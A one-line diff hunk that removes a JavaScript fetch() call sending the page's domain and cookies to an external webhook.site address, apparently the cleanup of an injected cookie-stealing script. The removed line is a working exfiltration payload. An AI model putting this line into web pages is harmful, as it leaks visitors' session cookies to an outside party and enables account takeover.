@@ -1,1 +1,0 @@
-fetch('https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?from=weweave-script&domain='+document.domain+'&cookie='+document.cookie);
